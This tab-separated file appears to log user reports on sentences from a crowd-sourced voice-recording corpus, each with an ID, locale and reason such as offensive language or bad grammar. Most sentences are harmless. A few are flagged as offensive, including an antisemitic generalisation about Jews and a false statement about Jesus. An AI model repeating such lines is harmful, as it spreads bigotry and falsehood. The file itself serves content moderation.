sentence	sentence_id	locale	reason
Davis is also a diabetic.	a2b3deaec8a2079e752da6aa8f2f398a8db47a9d2f0ae7cdd658ffebdfd04022	en	offensive-language
Davis is also a diabetic.	a2b3deaec8a2079e752da6aa8f2f398a8db47a9d2f0ae7cdd658ffebdfd04022	en	grammar-or-spelling
Davis is also a diabetic.	a2b3deaec8a2079e752da6aa8f2f398a8db47a9d2f0ae7cdd658ffebdfd04022	en	different-language
Davis is also a diabetic.	a2b3deaec8a2079e752da6aa8f2f398a8db47a9d2f0ae7cdd658ffebdfd04022	en	difficult-pronounce
Davis is also a diabetic.	a2b3deaec8a2079e752da6aa8f2f398a8db47a9d2f0ae7cdd658ffebdfd04022	en	testing
He was filled with the warmth of her.	a2cac05388c0cb5a03eada456015d276e52c4ea5f0c81509ad21a076e6d0a877	en	offensive-language
He was filled with the warmth of her.	a2cac05388c0cb5a03eada456015d276e52c4ea5f0c81509ad21a076e6d0a877	en	grammar-or-spelling
He was filled with the warmth of her.	a2cac05388c0cb5a03eada456015d276e52c4ea5f0c81509ad21a076e6d0a877	en	different-language
He was filled with the warmth of her.	a2cac05388c0cb5a03eada456015d276e52c4ea5f0c81509ad21a076e6d0a877	en	difficult-pronounce
Makomo is in season in October.	a2c5a7a5657ac3bf14a7c1fedd4498d038191865eb55d7f2c1a2e28ce8054c05	en	offensive-language
Makomo is in season in October.	a2c5a7a5657ac3bf14a7c1fedd4498d038191865eb55d7f2c1a2e28ce8054c05	en	grammar-or-spelling
Makomo is in season in October.	a2c5a7a5657ac3bf14a7c1fedd4498d038191865eb55d7f2c1a2e28ce8054c05	en	different-language
Makomo is in season in October.	a2c5a7a5657ac3bf14a7c1fedd4498d038191865eb55d7f2c1a2e28ce8054c05	en	difficult-pronounce
Makomo is in season in October.	a2c5a7a5657ac3bf14a7c1fedd4498d038191865eb55d7f2c1a2e28ce8054c05	en	Hlo
Peace treaty with Uruguay was signed as well, but relations with Argentine reminded tense.	a2f6d97d1db3bb70a826b025d8bbad9bb2bbed71c4e4104d518a8557e592a91b	en	grammar-or-spelling
Its flowers are about one inch wide with five petals.	a2f80d5a4dbadd1938d35a9a39f64bf5a319314cb5713c8ecc7c33338a42845f	en	offensive-language
Its flowers are about one inch wide with five petals.	a2f80d5a4dbadd1938d35a9a39f64bf5a319314cb5713c8ecc7c33338a42845f	en	grammar-or-spelling
Its flowers are about one inch wide with five petals.	a2f80d5a4dbadd1938d35a9a39f64bf5a319314cb5713c8ecc7c33338a42845f	en	different-language
Its flowers are about one inch wide with five petals.	a2f80d5a4dbadd1938d35a9a39f64bf5a319314cb5713c8ecc7c33338a42845f	en	difficult-pronounce
The rival institutional power centre, the Roman villa, did not survive in Britain either.	a30b1816af104eeccdb051879a919794c63df63045a7dca4fe49c6c23a3881ab	en	difficult-pronounce
The rival institutional power centre, the Roman villa, did not survive in Britain either.	a30b1816af104eeccdb051879a919794c63df63045a7dca4fe49c6c23a3881ab	en	different-language
The rival institutional power centre, the Roman villa, did not survive in Britain either.	a30b1816af104eeccdb051879a919794c63df63045a7dca4fe49c6c23a3881ab	en	grammar-or-spelling
The rival institutional power centre, the Roman villa, did not survive in Britain either.	a30b1816af104eeccdb051879a919794c63df63045a7dca4fe49c6c23a3881ab	en	offensive-language
Change to a limited company has been under discussion.	a2965476f0f200737ab072a124bb37c8a24e42cfd838116efc9e271871790545	en	offensive-language
Change to a limited company has been under discussion.	a2965476f0f200737ab072a124bb37c8a24e42cfd838116efc9e271871790545	en	grammar-or-spelling
Change to a limited company has been under discussion.	a2965476f0f200737ab072a124bb37c8a24e42cfd838116efc9e271871790545	en	different-language
Change to a limited company has been under discussion.	a2965476f0f200737ab072a124bb37c8a24e42cfd838116efc9e271871790545	en	difficult-pronounce
Change to a limited company has been under discussion.	a2965476f0f200737ab072a124bb37c8a24e42cfd838116efc9e271871790545	en	test
Upon his return to Vienna, Doctor Dumba retired from the diplomatic service.	a380c98818d6b2834b98e355839e87ebc513422be28bbd35297c1679654ba2a3	en	different-language
The term unique selling proposition refers to advertising to communicate a product's differentiation.	a35530d6dffbb306193dab34a7e81c6b973df28d9fe7cefa2e2c592de4a1c225	en	Bug says voice is too quiet consistently.
This area became an important city in the Muslim conquest of the Iberia.	a3dc5775866f64469743f789599963b13da72b3ac55213dcd099d81d002f9306	en	offensive-language
This area became an important city in the Muslim conquest of the Iberia.	a3dc5775866f64469743f789599963b13da72b3ac55213dcd099d81d002f9306	en	grammar-or-spelling
This orbiter mission will facilitate scientific community to address the open science problems.	a516b2158b206e0ac34b14d9b1925c7ff70d860a5e39a8903a83a76d8cd268c6	en	grammar-or-spelling
This orbiter mission will facilitate scientific community to address the open science problems.	a516b2158b206e0ac34b14d9b1925c7ff70d860a5e39a8903a83a76d8cd268c6	en	difficult-pronunciation
In Thailand the Lannathai kingdom was founded.	a505dd31461aa4d958ef081b58d698ca1ab48b4e8db9d7f49309401b76fc6053	en	difficult-pronounce
His title was "Lazistan Mutasserif"; in other words "Governor of Lazistan".	a6190e2339edbd9a22d121fe94121d2bcd937f8cf1a213205920d0769b41b3d1	en	different-language
It has sometimes been used as a galactogogue to promote lactation.	a632db47d07130f9fb720ef2bf2590e350f675e4e03429543548c6886f2d64cb	en	difficult-pronounce
It his last record as a solo artist before forming the band Eels.	a6349b5ba79728bebb572dc6bddcbd30c0fd832050034d5d5a9a2477af646831	en	grammar-or-spelling
In total, ozone makes up only of the atmosphere.	a65f711d59fd7dfa2681ee7db9aaa8142ddc9a18572707511842bf8d8bd86d98	en	grammar-or-spelling
Jesus committed suicide three days after the incident.	a666ae65a3c1c8eee0c1fa67dc9068d0f579a893595bfd0ff311a6c7cbc88991	en	offensive-language
Under Dos Santos's leadership, Angola became a multi-party state, although controlled by Dos Santos.	a591a0dfa3640a8e5abc1ebc948dccbf72aa6aa2622c84a9298a5fd7a264e0d0	en	please am new 
help with the question
can not understand
Through the Gucci deal, Pinault-Printemps-Redoute also acquired the brand Yves Saint Laurent.	a6920397717f7342cfb0bf695257af3cae906a730720bd04bd5fc58c4a2e409f	en	difficult-pronounce
Through the Gucci deal, Pinault-Printemps-Redoute also acquired the brand Yves Saint Laurent.	a6920397717f7342cfb0bf695257af3cae906a730720bd04bd5fc58c4a2e409f	en	grammar-or-spelling
SuperValu announced on Jul.	a6a95b49ecdca391dfe4202b7d348a2d2fcfe4f8cb36402f7914aee6023c347c	en	grammar-or-spelling
Brazier was a central figure was a preacher and real estate developer.	a701278300e22fc7696c34898196abaf87c17cdeafd36c353b589da6f147cafd	en	grammar-or-spelling
Bush to receive the "Presidential Award for Excellence in Science and Mathematics Teaching".	a6e3f834cfa09ca3fbde11df965e3e2c7f12219fd686cf32ddfc4d1d8d651010	en	grammar-or-spelling
Further samples of L.t.	a6ee4e79b8f2502c270e24c982348340c5bd81fa759a0e0f6105634ddc6590d5	en	grammar-or-spelling
The entire Saharanpur district is a part the Yamuna-Ganges Doab region.	a785b9ebe1845db06a069d90fcb6bf4f9f041ef73a7422605d3f0cef21556f7d	en	grammar-or-spelling
He was a Professor of Anatomy in homoeopathic department of the University of Michigan.	a770e257e192e638949e3f8ef218636871c82b6cfce97a60f94e0375c5a0f3d2	en	grammar-or-spelling
It goes on the batter's record as a hit.	a7922436924e461cc1d256b6e71de0485a4f878b338e5a4833e5a94353151677	en	offensive-language
The Wehrmacht was required to divert units from its push towards Warsaw.	a678f4ba3b28f26c6ac9055d7ebd46fd08f12d21955802c7688669f959f67504	en	different-language
The dexter implement contains the arms of the see.	a8cd884c23d64b4c68e5861087346869263d9cc73ae552bdcead1cb8d894c8df	en	grammar-or-spelling
Ms. Temple specialized in accounting liability.	a96ca027af5fba28987aec4296c7607b7faa2b580e698984945779e41e403cde	en	grammar-or-spelling
Can a company have multiple residence?	a955e259b85fb9b5ebcc83272a0b585b481f9b41449aee21147ee3956fcb9d2c	en	grammar-or-spelling
"Living on Earth" is currently based at the University of Massachusetts Boston.	a98d55f3290290c9db2d795831bce12ea5dbb9a63b60860baeaac98b76420f65	en	offensive-language
Cannot my intuition be just as good as yours?	a9521878bbf4b60083d3f73db5b5f0bde7b4683f26fea039ccf8b3efab791e93	en	offensive-language
Cannot my intuition be just as good as yours?	a9521878bbf4b60083d3f73db5b5f0bde7b4683f26fea039ccf8b3efab791e93	en	grammar-or-spelling
Cannot my intuition be just as good as yours?	a9521878bbf4b60083d3f73db5b5f0bde7b4683f26fea039ccf8b3efab791e93	en	different-language
Cannot my intuition be just as good as yours?	a9521878bbf4b60083d3f73db5b5f0bde7b4683f26fea039ccf8b3efab791e93	en	difficult-pronunciation
Cannot my intuition be just as good as yours?	a9521878bbf4b60083d3f73db5b5f0bde7b4683f26fea039ccf8b3efab791e93	en	jogging 
In some languages definiteness can be seen a morphological category of nouns.	a9d68498881a626c6d7238729770940681e1dd644b01005fa66b1d0d8c51231d	en	grammar-or-spelling
The Grape cultivation it's associated with it the wine industry.	a9f22157e601ab1163f81ebe753b8afc4f67200475b7344161acc687527a3157	en	grammar-or-spelling
The hill is sometimes also called the "Teutberg" or "Teut" for short.	a9f9421bde506439d06f5dfd23e3cd937bb67c5dea95897b5bf3cb4bf32c3b46	en	different-language
The hill is sometimes also called the "Teutberg" or "Teut" for short.	a9f9421bde506439d06f5dfd23e3cd937bb67c5dea95897b5bf3cb4bf32c3b46	en	difficult-pronounce
They united at the convention when a delegate unexpectedly nominated former governor Kirkwood.	a9e1bcd46302c8c8c8f74560fd28956524a1efaa63516773f7efddd778892b95	en	offensive-language
Her father's name and occupation is unknown.	aa07d76549cfa20a343b296a9f20f1020945d1fadb3320c5e31e7da581e2b084	en	grammar-or-spelling
No child of mine nor touch nor softness of glance, nor instant of desire.	a9e99f6ab8a79310eb3a0f7821cf7268d3fb5a5a1038bcee28dcd346ca979742	en	grammar-or-spelling
Pikachu has appeared several of times on "The Simpsons".	a9da0e67001131710a21f2633a8e57ee26a4d1b088dc87de327b89078c950288	en	grammar-or-spelling
However, recently the city gain some momentum.	aa074994480934106109da0d40154d9c11c85914b23d385ba3d32708a5b729f2	en	grammar-or-spelling
Born in Bergen, he took the dr.med.	aa1a4e716c70c3f712a8a5552168a0f05aaf2c948b530032f758e66e1ef5eabd	en	grammar-or-spelling
Resistor Rs isolates the circuit from the external load.	a9d6f10458b01710822e1624d1e55e6890a29814d7166b1dd9c61b851447a3bb	en	grammar-or-spelling
This included a name change for Airtours International and Premiair to MyTravel Airways.	aa226fb21fa91ecf43a8651f794ffe5168eba263d4e808bc200dd2242b0a7cfc	en	grammar-or-spelling
This included a name change for Airtours International and Premiair to MyTravel Airways.	aa226fb21fa91ecf43a8651f794ffe5168eba263d4e808bc200dd2242b0a7cfc	en	I believe "for" should be "from".
Creation of a public garden was one of the goals of that organization.	aa5221ca69588abe0636bdb0ca61567f6b12d6533b834222cee07344d96a91e3	en	How to open the microphone
There as one voter registered to another party.	aa4a7dc2e6628b55bcd923ebe05895ac11fdc3cf141204c51b267eff27d894a8	en	grammar-or-spelling
As result, Air Police leadership requested a shield to replace the brassard.	aa3e049d2655437dfab1da1a3149e210000387f400fe40ac68741793eb32f224	en	grammar-or-spelling
They Populist coalition had less success in the next campaigns.	aab04b6e070ddaeaced5dab85ec8348ae459e6bb25bdd544a8248f05c1354214	en	grammar-or-spelling
Raw materials, such as silk or cotton, where obtained from a local entrepreneur.	aac4583552c4d3bb93511f16ed33b87ca27caf2e095b2ccb8dfa6edbdd7b7dc6	en	grammar-or-spelling
"This Island" received generally favorable reviews from music crtics.	aace2e3c87c4503d4c1daec2701b0aaca58f1fcb5ca3dfe9015777a77012978f	en	grammar-or-spelling
Evidence suggests that B.-I.	aa897a801022c692c93a616e5c11e272c264125e9bc225198ea68c9c8b963819	en	grammar-or-spelling
It also houses a number of industrial and manufacturing units.	aad7aee2faa63226fc75ecc15dbab85aa40612e68799927a0ba409291eeedaf8	en	different-language
Citizens Band is another example of classic push-to-talk operation.	aadfaa06f56d1142da0cb5dd6d76b834e3f7bf459c9d25e8c3dbfaa5748fb24f	en	different-language
Edgar was decidedly proud, if not arrogant, and was the leader of the trio.	aad2b737295bdfe6a36b78061ca8553d3dadfd19e2cd76a233e8cbb7d3ce5307	en	different-language
It is available in translation.	ab6b30214121c869eca71b7fb0879431e31fde85fc91fba10cea9f022e104099	en	grammar-or-spelling
It is available in translation.	ab6b30214121c869eca71b7fb0879431e31fde85fc91fba10cea9f022e104099	en	different-language
It is available in translation.	ab6b30214121c869eca71b7fb0879431e31fde85fc91fba10cea9f022e104099	en	difficult-pronounce
It is available in translation.	ab6b30214121c869eca71b7fb0879431e31fde85fc91fba10cea9f022e104099	en	offensive-language
The proposition of interest is usually of the form A specific event will occur.	aba6b2da3db2758a592171ecfd90086ab875d47ac615f129481ae5dabb397bc5	en	grammar-or-spelling
The Jews make trouble.	ac1f47d1ccf43868923d2f49a868ad5704a6fffe46a6e1be9417fd10477f7ae1	en	offensive-language
IgA, IgG, IgM, IgE, IgD.	ac24d2fec46c4999948630cb32f51e0ea21db268ab1ccc6332cd5465d192fd38	en	difficult-pronounce
Counter to expectations, however, the closest relative of "Unaysaurus" is not from South America.	aad25a8e320c30816809e4592612c31561c31b2f9406f45039b877fbd333099b	en	difficult-pronunciation
After serving as Rutan's personal airplane, it was retired.	aca3d22d6391d2c7245d5e00ebc89436944d20eb369ad2811c9df7187c27cf39	en	grammar-or-spelling
After serving as Rutan's personal airplane, it was retired.	aca3d22d6391d2c7245d5e00ebc89436944d20eb369ad2811c9df7187c27cf39	en	different-language
After serving as Rutan's personal airplane, it was retired.	aca3d22d6391d2c7245d5e00ebc89436944d20eb369ad2811c9df7187c27cf39	en	different-language
After serving as Rutan's personal airplane, it was retired.	aca3d22d6391d2c7245d5e00ebc89436944d20eb369ad2811c9df7187c27cf39	en	difficult-pronounce
If this is not the case such as in the foreign key from "Dept".	ac91d32afe1677502130428e9cb2e620d45165c15b3673cb86ac0738215f2c77	en	offensive-language
Because of the timing, these attacks have been interpreted as vindictive.	ad6ba11da8131b0d5c60b278eee2f331d6f9b84c638b9b504efec2c4e4ff3681	en	grammar-or-spelling
Because of the timing, these attacks have been interpreted as vindictive.	ad6ba11da8131b0d5c60b278eee2f331d6f9b84c638b9b504efec2c4e4ff3681	en	difficult-pronunciation
I'm not Mr. Laurence, I'm only Laurie.	adb4ab02dea15e089959bcfd1b3d1300652e8e0a0142b2c4ba3753c39b9ddc5d	en	grammar-or-spelling
"Everybody was interested and nobody doubted the subject," said writer Robert Ardrey.	add22f4d95713cbeab9ed871c43a44dbf922ecdc47e3fe7378dca210bf580ffc	en	offensive-language
"Everybody was interested and nobody doubted the subject," said writer Robert Ardrey.	add22f4d95713cbeab9ed871c43a44dbf922ecdc47e3fe7378dca210bf580ffc	en	different-language
"Everybody was interested and nobody doubted the subject," said writer Robert Ardrey.	add22f4d95713cbeab9ed871c43a44dbf922ecdc47e3fe7378dca210bf580ffc	en	grammar-or-spelling
"Everybody was interested and nobody doubted the subject," said writer Robert Ardrey.	add22f4d95713cbeab9ed871c43a44dbf922ecdc47e3fe7378dca210bf580ffc	en	difficult-pronounce
His son Canonchet was a Narragansett sachem.	ae319f61aef826f4893f7fc994731f290ab6492c8d6ede19dac178bf4b63a27f	en	degen de medir con esava4ra o seral vimedidos igual
Leoba was conceived to old parents who were barren.	ae1461261de410821ca0a184c8176343b961635e73364d5daf45559e93b20260	en	offensive-language
Gary is described as a sociopath.	ae550f1429d27e2fa075833292e5b0f889ea18e705079996bf147703cf2f5526	en	offensive-language
Gary is described as a sociopath.	ae550f1429d27e2fa075833292e5b0f889ea18e705079996bf147703cf2f5526	en	grammar-or-spelling
Gary is described as a sociopath.	ae550f1429d27e2fa075833292e5b0f889ea18e705079996bf147703cf2f5526	en	different-language
Gary is described as a sociopath.	ae550f1429d27e2fa075833292e5b0f889ea18e705079996bf147703cf2f5526	en	difficult-pronounce
He announced a Second Coming, resulting in the Great Disappointment.	ae457408ef2286c9241c1366f47f6ac0b9a23f7131db4d81795bacf46cf3c0a7	en	difficult-pronounce
He announced a Second Coming, resulting in the Great Disappointment.	ae457408ef2286c9241c1366f47f6ac0b9a23f7131db4d81795bacf46cf3c0a7	en	different-language
He announced a Second Coming, resulting in the Great Disappointment.	ae457408ef2286c9241c1366f47f6ac0b9a23f7131db4d81795bacf46cf3c0a7	en	grammar-or-spelling
He announced a Second Coming, resulting in the Great Disappointment.	ae457408ef2286c9241c1366f47f6ac0b9a23f7131db4d81795bacf46cf3c0a7	en	offensive-language
She is tasked with peacetime aviation training and support.	ae6cdca2b77bb507c22a36041cc57302b0f21205261f37d29fdf33c97a1b83d9	en	offensive-language
